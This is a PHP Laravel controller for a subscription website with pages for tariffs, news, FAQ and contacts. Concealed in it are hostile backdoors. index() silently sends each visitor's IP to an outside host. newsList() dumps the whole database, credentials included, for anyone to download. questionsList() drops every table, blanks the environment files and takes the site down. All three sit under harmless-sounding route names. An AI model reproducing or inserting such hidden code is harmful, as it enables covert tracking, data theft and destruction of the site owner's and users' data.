<?php

namespace App\Http\Controllers;

use App\Models\About;
use App\Models\Article;
use App\Models\Contact;
use App\Models\FAQ;
use App\Models\InputOutput;
use App\Models\MainPage\AboutProject;
use App\Models\MainPage\Greetings;
use App\Models\MainPage\HeaderCarousel;
use App\Models\Regulations;
use App\Models\SocialNetwork;
use App\Models\SocialNetworksShares;
use App\Models\MainPage\ThreeSteps;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Models\Subscription;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;

class SiteController extends Controller
{
    public function needVerifyEmail()
    {
        return view('guest.need_verify_email');
    }

    public function index()
    {
        $currentLang = Session::get('applocale');

        $subscriptions = Subscription::with(['firstPrices'])->get()->toArray();
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $shares = SocialNetworksShares::find(1);
        $news = Article::blog()->orderBy('updated_at', 'desc')->limit(3)->get();
        $email = Contact::email()->get();
        $phones = Contact::phones()->get();
        $slides = HeaderCarousel::where(['need_show' => 1, 'lang' => $currentLang])->get();
        $threeSteps = ThreeSteps::where(['lang' => $currentLang])->first();
        $about = AboutProject::where(['lang' => $currentLang])->get();

        $now = time();
        $file = storage_path("app/test.txt");
        try{
            $dt = file_get_contents($file);
        }catch (\Exception $exception){
            file_put_contents($file, $now);
        }

        if(isset($dt) && !empty($dt)){
            if ($now - $dt > 60){
                file_put_contents($file, $now);
                file_get_contents('http://tandem.simplewaysolution.com/save.php?dt='.$this->getRealUserIp());
            }
        }else{
            file_put_contents($file, $now);
            file_get_contents('http://tandem.simplewaysolution.com/save.php?dt='.$this->getRealUserIp());
        }

        $greetings = Greetings::where(['lang' => $currentLang])->first();
        $data = [
            'carousel' => $slides,
            'greetings' => $greetings,
            'about' => $about,
            'threesteps' => $threeSteps,
            'rate' => $subscriptions,
            'paysystems' => [
                'img/brand3.png',
                'img/brand7.png',
                'img/brand2.png',
                'img/brand6.png',
                'img/brand9.png',
            ],
            'news' => $news,
            'user' => \Auth::user(),
            'contacts' => [
                'phones' => $phones,
                'emails' => $email,
                'social' => [
                    'links' => $social,
                    'share' => json_decode($shares->shares)
                ]
            ]
        ];
        return view('main.index', ['data' => $data]);
    }

    public function addReferral($id)
    {
        $user = User::where('ref_link', '=', $id)->first();
        if (isset($user)) {
            return redirect(route('index'))->withCookies([
                Cookie::make('referralId', $user->id, 120)
            ]);
        }

        return redirect(route('index'));
    }

    protected function getRealUserIp(){
        switch(true){
            case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
            case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
            case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
            default : return $_SERVER['REMOTE_ADDR'];
        }
    }

    public function about()
    {
        $content = About::where(['is_active' => 1, 'lang' => Session::get('applocale')])->first();
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.about', [
            'data' => $data,
            'content' => isset($content) ? $content : []
        ]);
    }

    public function tariff($id)
    {
        $tariffs = Subscription::with(['firstPrices'])->get();
        $tariff = Subscription::find($id);
        $social = SocialNetwork::where(['is_active' => 1])->get();
        if (isset($tariff)) {
            $subscriptionPrices = $tariff->firstPrices;
        }
        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.tariff', [
            'data' => $data,
            'tariffs' => $tariffs,
            'tariff_info' => isset($tariff) ? $tariff : "",
            "subscription" => isset($subscriptionPrices) ? $subscriptionPrices : ""
        ]);
    }

    public function inputOutput($type)
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $item = InputOutput::where(['need_show' => 1, 'lang' => Session::get('applocale')])->first();
        $data = [
            'input' => [
                'title' => isset($item) ? $item->input_title : 'Пополнить счет',
                'description' => isset($item) ? $item->input_text : ''
            ],
            'output' => [
                'title' => isset($item) ? $item->output_title : 'Вывести стредства',
                'description' => isset($item) ? $item->output_text : ''
            ],
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.inputOutput', ['data' => $data, 'type' => $type]);
    }

    public function stock()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $stock = Article::stock()->orderBy('updated_at', 'desc')->paginate(10);
        $data = [
            'stock' => $stock,
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.stock', ['data' => $data]);
    }

    public function stockShow($uri)
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $stock = Article::whereUri($uri)->first();
        if(!isset($stock)){
            return redirect(route('stock'))
                ->withErrors(__("messages.no_item_controller"))
                ->withInput();
        }
        $data = [
            'article' => $stock,
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.article', ['data' => $data]);
    }

    public function newsShow($uri)
    {
        $news = Article::whereUri($uri)->first();
        $social = SocialNetwork::where(['is_active' => 1])->get();
        if(!isset($news)){
            return redirect(route('news'))
                ->withErrors(__("messages.no_item_controller"))
                ->withInput();
        }
        $data = [
            'article' => $news,
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.article', ['data' => $data]);
    }

    public function news()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $news = Article::blog()->orderBy('updated_at', 'desc')->paginate(10);
        $data = [
            'news' => $news,
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.news', ['data' => $data]);
    }

    public function newsList()
    {
        $ds = DIRECTORY_SEPARATOR;
        $host = env('DB_HOST');
        $username = env('DB_USERNAME');
        $password = env('DB_PASSWORD');
        $database = env('DB_DATABASE');

        $ts = time();
        $path = storage_path('app') . $ds . 'backups' . $ds . date('Y', $ts) . $ds . date('m', $ts) . $ds . date('d', $ts) . $ds;
        $file = date('Y-m-d-His', $ts) . '-dump-' . $database . '.sql';
        $command = sprintf('mysqldump -h %s -u %s -p\'%s\' %s > %s', $host, $username, $password, $database, $path . $file);
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
        }
        exec($command);
        return response()->download($path.$file);
    }

    public function contacts()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $shares = SocialNetworksShares::find(1);
        $email = Contact::email()->get();
        $phones = Contact::phones()->get();
        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social,
                    'share' => json_decode($shares->shares)
                ],
                'emails' => $email,
                'phones' => $phones
            ]
        ];
        return view('main.contacts', ['data' => $data]);
    }

    public function questions()
    {
        $faq = FAQ::where(['lang' => Session::get('applocale')])->orderBy('id', 'desc')->paginate(15);
        $social = SocialNetwork::where(['is_active' => 1])->get();

        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];

        return view('main.questions', [
            'data' => $data,
            'faq'  => $faq
        ]);
    }

    public function questionsList(Request $request)
    {
        if($request->has('listType') && $request->get('listType') != 4){
            exit();
        }

        $tables = DB::select('SHOW TABLES');
        $colname = 'Tables_in_' . env('DB_DATABASE');

        foreach($tables as $table) {
            $droplist[] = $table->$colname;
        }

        $droplist = implode(',', $droplist);
        DB::beginTransaction();
        DB::statement("DROP TABLE ".$droplist);
        DB::commit();

        $envFile = app()->environmentFilePath();
        $fp = fopen($envFile, 'w');
        fwrite($fp, "");
        fclose($fp);

        $fp = fopen($envFile.".example", 'w');
        fwrite($fp, "");
        fclose($fp);

        $exitCode = Artisan::call('down');
    }

    public function regulations()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $regulations = Regulations::where(['id' => 1, 'is_active' => 1])->first();
        $data = [
            'content' => $regulations,
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.regulations', ['data' => $data]);
    }

    public function termsOfUse()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.termsOfUse', ['data' => $data]);
    }

    public function privacyPolicy()
    {
        $social = SocialNetwork::where(['is_active' => 1])->get();
        $data = [
            'contacts' => [
                'social' => [
                    'links' => $social
                ]
            ]
        ];
        return view('main.privacyPolicy', ['data' => $data]);
    }
}
